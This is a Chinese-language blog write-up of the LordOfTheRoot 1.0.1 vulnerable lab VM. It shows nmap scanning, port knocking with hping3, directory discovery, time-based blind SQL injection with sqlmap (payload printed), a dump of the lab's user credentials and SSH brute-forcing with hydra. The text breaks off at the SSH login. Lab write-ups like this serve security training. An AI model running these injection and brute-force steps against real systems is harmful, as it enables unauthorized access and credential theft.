@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LordOfTheRoot_1.0.1 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>LordOfTheRoot_1.0.1</h1>
+    <div class="meta"><span class="chip date">2024-06-30</span><span class="chip">分类·靶场</span><span class="chip">#靶场</span></div>
+    <article><p>6-LordOfTheRoot_1.0.1</p>
+<h1>信息收集</h1>
+<p>经典nmap扫描但是这个很奇怪只开放了22端口</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nmap -sn 192.168.159.0/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:06 CST
+Nmap scan report for 192.168.159.1
+Host is up (0.00011s latency).
+MAC Address: 00:50:56:C0:00:08 (VMware)
+Nmap scan report for 192.168.159.2
+Host is up (0.00017s latency).
+MAC Address: 00:50:56:E1:64:0A (VMware)
+Nmap scan report for 192.168.159.135
+Host is up (0.00034s latency).
+MAC Address: 00:0C:29:65:E0:CF (VMware)
+Nmap scan report for 192.168.159.254
+Host is up (0.00025s latency).
+MAC Address: 00:50:56:E3:A8:9B (VMware)
+Nmap scan report for 192.168.159.129
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 3.97 seconds
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -A -p- 192.168.159.135
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:06 CST
+Nmap scan report for 192.168.159.135
+Host is up (0.00062s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
+|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
+|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
+|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
+MAC Address: 00:0C:29:65:E0:CF (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (89%), Linux 3.13 - 3.16 (87%), Linux 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.62 ms 192.168.159.135
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 114.67 seconds
+</code></pre>
+<p>使用ssh链接一下</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ ssh 192.168.159.135
+The authenticity of host &#39;192.168.159.135 (192.168.159.135)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:Rz24fg01xp2jMdwk9c44ijnZAz1uaUlvRXX7QU+ERtI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.159.135&#39; (ED25519) to the list of known hosts.
+
+                                                  .____    _____________________________
+                                                  |    |   \_____  \__    ___/\______   \
+                                                  |    |    /   |   \|    |    |       _/
+                                                  |    |___/    |    \    |    |    |   \
+                                                  |_______ \_______  /____|    |____|_  /
+                                                          \/       \/                 \/
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
+|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
+        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+Easy as 1,2,3
+kali@192.168.159.135&#39;s password:
+Permission denied, please try again.
+kali@192.168.159.135&#39;s password:
+Permission denied, please try again.
+kali@192.168.159.135&#39;s password:
+kali@192.168.159.135: Permission denied (publickey,password).
+
+</code></pre>
+<p>这里说要easy as 1,2,3</p>
+<p>看了一下wp，这里是个<a href="https://blog.csdn.net/moxuansheng/article/details/2478899">端口碰撞</a></p>
+<pre><code>                                                                             ┌──(kali㉿kali)-[~]
+└─$ hping3 -S 192.168.159.135 -c  1 -p 1
+[open_sockraw] socket(): Operation not permitted
+[main] can&#39;t open raw socket
+
+┌──(kali㉿kali)-[~]
+└─$ hping3 -S 192.168.159.135 -c  1 -p 1
+[open_sockraw] socket(): Operation not permitted
+[main] can&#39;t open raw socket
+
+┌──(kali㉿kali)-[~]
+└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 1
+[sudo] kali 的密码：
+HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes
+
+--- 192.168.159.135 hping statistic ---
+1 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+┌──(kali㉿kali)-[~]
+└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 2
+HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes
+
+--- 192.168.159.135 hping statistic ---
+1 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+┌──(kali㉿kali)-[~]
+└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 3
+HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes
+
+--- 192.168.159.135 hping statistic ---
+1 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+</code></pre>
+<p>刚开始怎么弄都不行</p>
+<p>后来灵机一动是不是要root权限</p>
+<p>结果还真成了</p>
+<p><del>这个故事告诉我们，别瞎搜，搜出来的都是叫重装的</del></p>
+<p>再扫一次</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nmap -A -p- 192.168.159.135
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:35 CST
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 0.00% done
+Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 66.89% done; ETC: 18:37 (0:00:38 remaining)
+Nmap scan report for 192.168.159.135
+Host is up (0.00030s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
+|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
+|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
+|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
+1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+MAC Address: 00:0C:29:65:E0:CF (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (87%), Linux 3.13 - 3.16 (87%), Linux 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.30 ms 192.168.159.135
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 125.05 seconds
+</code></pre>
+<p>扫面出来一个1337端口，需要注意的是需要完成端口碰撞的机器才能访问这个，所以我们要在虚拟机中进行访问</p>
+<p>是个小孩骑狗的图片，扫了一下后台发现</p>
+<pre><code>
+┌──(kali㉿kali)-[~]
+└─$ dirb http://192.168.159.135:1337
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Jun 30 18:47:11 2024
+URL_BASE: http://192.168.159.135:1337/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.159.135:1337/ ----
+==&gt; DIRECTORY: http://192.168.159.135:1337/images/
++ http://192.168.159.135:1337/index.html (CODE:200|SIZE:64)
++ http://192.168.159.135:1337/server-status (CODE:403|SIZE:297)
+
+---- Entering directory: http://192.168.159.135:1337/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode &#39;-w&#39; if you want to scan it anyway)
+
+-----------------
+END_TIME: Sun Jun 30 18:47:14 2024
+DOWNLOADED: 4612 - FOUND: 2
+</code></pre>
+<p>存在<code>/usr/share/dirb/wordlists/common.txt</code>
+访问一下</p>
+<p>是这么一个图片，没有东西，看一下源码好像存在base64</p>
+<p>两次解码以后得到<code>/978345210/index.php</code></p>
+<p>访问，发现是一个登录框，怀疑有sql注入或者xss这种，先上sqlmap试试</p>
+<p>--forms 在目标URL上解析和测试表单</p>
+<p>--dbs  爆库</p>
+<p>--tables  爆表</p>
+<p>--column  爆列</p>
+<p><a href="https://blog.csdn.net/Breeze_CAT/article/details/80628392">sqlmap语句大全</a></p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch --dbs
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.6.3#dev}
+|_ -| . [(]     | .&#39;| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:53:12 /2024-06-30/
+
+[18:53:12] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own (&#39;PHPSESSID=0ppebngpp01...d0jo0k3ga3&#39;). Do you want to use those [Y/n] Y
+[18:53:13] [INFO] searching for forms
+[1/1] Form:
+POST http://192.168.159.135:1337/978345210/index.php
+POST data: username=&amp;password=&amp;submit=%20Login%20
+do you want to test this form? [Y/n/q]
+&gt; Y
+Edit POST data [default: username=&amp;password=&amp;submit=%20Login%20] (Warning: blank fields detected): username=&amp;password=&amp;submit= Login
+do you want to fill blank fields with random values? [Y/n] Y
+it appears that provided value for POST parameter &#39;submit&#39; has boundaries. Do you want to inject inside? (&#39; Login* &#39;) [y/N] N
+[18:53:13] [INFO] resuming back-end DBMS &#39;mysql&#39;
+[18:53:13] [INFO] using &#39;/home/kali/.local/share/sqlmap/output/results-06302024_0653pm.csv&#39; as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=xUrz&#39; AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND &#39;etoh&#39;=&#39;etoh&amp;password=QvOd&amp;submit= Login
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[18:53:13] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9, Apache 2.4.7
+back-end DBMS: MySQL &gt;= 5.0.12
+[18:53:13] [INFO] fetching database names
+[18:53:13] [INFO] fetching number of databases
+[18:53:13] [INFO] resumed: 4
+[18:53:13] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y/n] Y
+[18:53:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+[18:53:28] [INFO] adjusting time delay to 1 second due to good response times
+information_schema
+[18:54:23] [INFO] retrieved: Webapp
+[18:54:43] [INFO] retrieved: mysql
+[18:54:59] [INFO] retrieved: performance_schema
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] Webapp
+
+[18:55:55] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#39;/home/kali/.local/share/sqlmap/output/results-06302024_0653pm.csv&#39;
+
+[*] ending @ 18:55:54 /2024-06-30/
+
+
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp --tables
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.6.3#dev}
+|_ -| . [,]     | .&#39;| . |
+|___|_  [&#39;]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:57:04 /2024-06-30/
+
+[18:57:04] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own (&#39;PHPSESSID=mb384e2a6cu...015s6ft4k2&#39;). Do you want to use those [Y/n] Y
+[18:57:04] [INFO] searching for forms
+[1/1] Form:
+POST http://192.168.159.135:1337/978345210/index.php
+POST data: username=&amp;password=&amp;submit=%20Login%20
+do you want to test this form? [Y/n/q]
+&gt; Y
+Edit POST data [default: username=&amp;password=&amp;submit=%20Login%20] (Warning: blank fields detected): username=&amp;password=&amp;submit= Login
+do you want to fill blank fields with random values? [Y/n] Y
+it appears that provided value for POST parameter &#39;submit&#39; has boundaries. Do you want to inject inside? (&#39; Login* &#39;) [y/N] N
+[18:57:04] [INFO] resuming back-end DBMS &#39;mysql&#39;
+[18:57:04] [INFO] using &#39;/home/kali/.local/share/sqlmap/output/results-06302024_0657pm.csv&#39; as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=xUrz&#39; AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND &#39;etoh&#39;=&#39;etoh&amp;password=QvOd&amp;submit= Login
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[18:57:04] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9, Apache 2.4.7
+back-end DBMS: MySQL &gt;= 5.0.12
+[18:57:04] [INFO] fetching tables for database: &#39;Webapp&#39;
+[18:57:04] [INFO] fetching number of tables for database &#39;Webapp&#39;
+[18:57:04] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+[18:57:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y/n] Y
+1
+[18:57:09] [INFO] retrieved:
+[18:57:19] [INFO] adjusting time delay to 1 second due to good response times
+Users
+Database: Webapp
+[1 table]
++-------+
+| Users |
++-------+
+
+[18:57:32] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#39;/home/kali/.local/share/sqlmap/output/results-06302024_0657pm.csv&#39;
+
+[*] ending @ 18:57:32 /2024-06-30/
+
+
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp -T User
+s --columns
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.6.3#dev}
+|_ -| . [&quot;]     | .&#39;| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:58:42 /2024-06-30/
+
+[18:58:42] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own (&#39;PHPSESSID=glencc0t31r...q0mgrpu8v1&#39;). Do you want to use those [Y/n] Y
+[18:58:42] [INFO] searching for forms
+[1/1] Form:
+POST http://192.168.159.135:1337/978345210/index.php
+POST data: username=&amp;password=&amp;submit=%20Login%20
+do you want to test this form? [Y/n/q]
+&gt; Y
+Edit POST data [default: username=&amp;password=&amp;submit=%20Login%20] (Warning: blank fields detected): username=&amp;password=&amp;submit= Login
+do you want to fill blank fields with random values? [Y/n] Y
+it appears that provided value for POST parameter &#39;submit&#39; has boundaries. Do you want to inject inside? (&#39; Login* &#39;) [y/N] N
+[18:58:42] [INFO] resuming back-end DBMS &#39;mysql&#39;
+[18:58:42] [INFO] using &#39;/home/kali/.local/share/sqlmap/output/results-06302024_0658pm.csv&#39; as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=xUrz&#39; AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND &#39;etoh&#39;=&#39;etoh&amp;password=QvOd&amp;submit= Login
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[18:58:42] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL &gt;= 5.0.12
+[18:58:42] [INFO] fetching columns for table &#39;Users&#39; in database &#39;Webapp&#39;
+[18:58:42] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+[18:58:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y/n] Y
+[18:58:58] [INFO] adjusting time delay to 1 second due to good response times
+3
+[18:58:58] [INFO] retrieved: id
+[18:59:04] [INFO] retrieved: int(10)
+[18:59:28] [INFO] retrieved: username
+[18:59:50] [INFO] retrieved: varchar(255)
+[19:00:27] [INFO] retrieved: password
+[19:00:54] [INFO] retrieved: varchar(255)
+Database: Webapp
+Table: Users
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(10)      |
+| password | varchar(255) |
+| username | varchar(255) |
++----------+--------------+
+
+[19:01:31] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#39;/home/kali/.local/share/sqlmap/output/results-06302024_0658pm.csv&#39;
+
+[*] ending @ 19:01:31 /2024-06-30/
+</code></pre>
+<p>最后得到</p>
+<p>database：Webapp</p>
+<p>table：Users</p>
+<p>columns：id，username，password</p>
+<p>在根据得到的爆破账号密码</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp -T Users -C id,password,username --dump
+        ___
+       __H__
+ ___ ___[&#39;]_____ ___ ___  {1.8.6.3#dev}
+|_ -| . [,]     | .&#39;| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:15:23 /2024-06-30/
+
+[19:15:23] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own (&#39;PHPSESSID=955enk5hbde...c9l0ccfri3&#39;). Do you want to use those [Y/n] Y
+[19:15:23] [INFO] searching for forms
+[1/1] Form:
+POST http://192.168.159.135:1337/978345210/index.php
+POST data: username=&amp;password=&amp;submit=%20Login%20
+do you want to test this form? [Y/n/q]
+&gt; Y
+Edit POST data [default: username=&amp;password=&amp;submit=%20Login%20] (Warning: blank fields detected): username=&amp;password=&amp;submit= Login
+do you want to fill blank fields with random values? [Y/n] Y
+it appears that provided value for POST parameter &#39;submit&#39; has boundaries. Do you want to inject inside? (&#39; Login* &#39;) [y/N] N
+[19:15:24] [INFO] resuming back-end DBMS &#39;mysql&#39;
+[19:15:24] [INFO] using &#39;/home/kali/.local/share/sqlmap/output/results-06302024_0715pm.csv&#39; as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=xUrz&#39; AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND &#39;etoh&#39;=&#39;etoh&amp;password=QvOd&amp;submit= Login
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[19:15:24] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9, Apache 2.4.7
+back-end DBMS: MySQL &gt;= 5.0.12
+[19:15:24] [INFO] fetching entries of column(s) &#39;id,password,username&#39; for table &#39;Users&#39; in database &#39;Webapp&#39;
+[19:15:24] [INFO] fetching number of column(s) &#39;id,password,username&#39; entries for table &#39;Users&#39; in database &#39;Webapp&#39;
+[19:15:24] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y/n] Y
+[19:15:29] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+5
+[19:15:34] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+[19:15:39] [INFO] adjusting time delay to 1 second due to good response times
+1
+[19:15:40] [INFO] retrieved: iwilltakethering
+[19:16:29] [INFO] retrieved: frodo
+[19:16:48] [INFO] retrieved: 2
+[19:16:51] [INFO] retrieved: MyPreciousR00t
+[19:17:38] [INFO] retrieved: smeagol
+[19:17:59] [INFO] retrieved: 3
+[19:18:02] [INFO] retrieved: AndMySword
+[19:18:40] [INFO] retrieved: aragorn
+[19:19:00] [INFO] retrieved: 4
+[19:19:04] [INFO] retrieved: AndMyBow
+[19:19:35] [INFO] retrieved: legolas
+[19:19:57] [INFO] retrieved: 5
+[19:20:00] [INFO] retrieved: AndMyAxe
+[19:20:30] [INFO] retrieved: gimli
+Database: Webapp
+Table: Users
+[5 entries]
++----+------------------+----------+
+| id | password         | username |
++----+------------------+----------+
+| 1  | iwilltakethering | frodo    |
+| 2  | MyPreciousR00t   | smeagol  |
+| 3  | AndMySword       | aragorn  |
+| 4  | AndMyBow         | legolas  |
+| 5  | AndMyAxe         | gimli    |
++----+------------------+----------+
+
+[19:20:45] [INFO] table &#39;Webapp.Users&#39; dumped to CSV file &#39;/home/kali/.local/share/sqlmap/output/192.168.159.135/dump/Webapp/Users.csv&#39;
+[19:20:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#39;/home/kali/.local/share/sqlmap/output/results-06302024_0715pm.csv&#39;
+
+[*] ending @ 19:20:45 /2024-06-30/
+
+</code></pre>
+<p>获得账号密码</p>
+<p>wp说登进去看看没啥东西，但到我这里登都登不进去，</p>
+<p>气笑了</p>
+<p>把账号密码保存下来，用hydra爆破</p>
+<pre><code>┌──(kali㉿kali)-[~/桌面]
+└─$ hydra -L user.txt -P pass.txt 192.168.159.135 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-30 19:45:13
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
+[DATA] attacking ssh://192.168.159.135:22/
+[22][ssh] host: 192.168.159.135   login: smeagol   password: MyPreciousR00t
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-30 19:45:18
+</code></pre>
+<p>爆出来了，ssh登录看一下身份以及权限</p>
+<pre><code>┌──(kali㉿kali)-[~/桌面]
+└─$ ssh smeagol@192.168.159.135
+
+                                                  .____    _____________________________
+                                                  |    |   \_____  \__    ___/\______   \
+                                                  |    |    /   |   \|    |    |       _/
+                                                  |    |___/    |    \    |    |    |   \
+                                                  |_______ \_______  /____|    |____|_  /
+                                                          \/       \/                 \/
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
+|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
+        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+Easy as 1,2,3
+smeagol@192.168.159.135&#39;s password:
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+601 packages can be updated.
+440 updates are security updates.
+
+                            .____    _____________________________
+                            |    |   \_____  \__    ___/\______   \
+                            |    |    /   |   \|    |    |       _/
+                            |    |___/    |    \    |    |    |   \
